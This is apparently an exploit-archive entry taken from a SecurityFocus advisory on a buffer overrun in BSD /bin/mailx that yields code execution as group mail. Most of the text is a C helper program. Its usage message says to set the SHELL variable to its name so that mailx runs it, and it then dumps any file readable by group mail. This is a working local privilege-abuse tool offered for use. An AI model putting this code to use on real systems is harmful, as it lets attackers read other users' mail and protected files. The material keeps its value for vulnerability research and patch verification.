source: http://www.securityfocus.com/bid/393/info
 
A buffer overrun exists in the /bin/mailx program. This program was originally developed as part of BSD, and is available on many Unix systems. By supplying a long, well crafted buffer as the username argument, an attacker can use it to execuate arbitrary code. On some systems, this will result in the ability to execute code as group mail.

// this is nothing special, it allows you to read files that are
// readable by the group 'mail'.
// feedback: segv <dan@rtfm.net>

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void usage(char *prog);

void main(int argc, char *argv[])
{
        char buffer[1024];
        int fd, bytes;

        if(argc != 3)
                usage(argv[0]);

        if((strcmp(argv[1],"-c")))
                usage(argv[0]);
        else {
                if((fd=open(argv[2],O_RDONLY)) == -1) {
                        perror("open");
                        exit(1);
                }
                while((bytes=read(fd,buffer,sizeof(buffer))) > 0)
                        write(1,buffer,bytes);

                close(fd);
        }
        exit(0);
}

void usage(char *prog)
{
        fprintf(stderr,"this program should be invoked by mailx\n");
        fprintf(stderr,"remember to set the env var 'SHELL' to the\n");
        fprintf(stderr,"name of this program.\n");
        exit(1);
}

